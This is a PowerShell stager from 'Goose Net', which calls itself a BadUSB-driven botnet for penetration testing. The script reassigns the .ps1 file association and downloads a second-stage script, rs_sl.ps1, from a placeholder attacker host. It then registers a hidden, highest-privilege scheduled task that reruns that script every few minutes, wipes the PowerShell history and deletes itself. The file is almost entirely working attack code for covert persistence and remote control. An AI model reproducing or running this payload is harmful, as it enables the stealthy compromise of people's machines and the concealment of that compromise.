<#
  Goose Net
  Goose net is an open source hardware attack botnet written in c#/processing
  and is used in conjunction with a bad usb at_tiny85 arduino usb keyboard emulator for use in a penetration
  testing environment.
  
  GNU General Public License (GPL) version 3
  
  Copyright (c) 2023 Anthony Logan Mitchell
  
  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.
  
  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
  GNU General Public License for more details.
  
  You should have received a copy of the GNU General Public License
  along with this program. If not, see <https://www.gnu.org/licenses/>.
 #>
$dotext = ".ps1"
$extfile = "powershell"
C:\Windows\system32\cmd.exe /c assoc $dotext=$extfile
C:\Windows\system32\cmd.exe /c "ftype $extfile=""C:\Windows\System32\powershell.exe"" ""%1"""

$client = New-Object System.Net.WebClient
$client.DownloadFile('<HOST_DOMAIN>/rs_sl.ps1', 'C:\\Windows\\Temp\\rs_sl.ps1')

$taskExists = Get-ScheduledTask | Where-Object {$_.TaskName -like "rs-task" }
if($taskExists) {
   Write-Output "EXISTS";
} else {
   Write-Output "Creating task...";
   C:\Windows\System32\schtasks.exe /create /tn rs-task /RL HIGHEST /tr "powershell -NoLogo -WindowStyle hidden -file C:\Windows\Temp\rs_sl.ps1" /sc minute /mo <DIAL_FREQUENCY> /ru (Get-CimInstance -ClassName Win32_ComputerSystem | Select-Object -expand UserName)
}

[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()
Clear-History
Remove-Item (Get-PSReadlineOption).HistorySavePath
Remove-Item $script:MyInvocation.MyCommand.Path -Force;
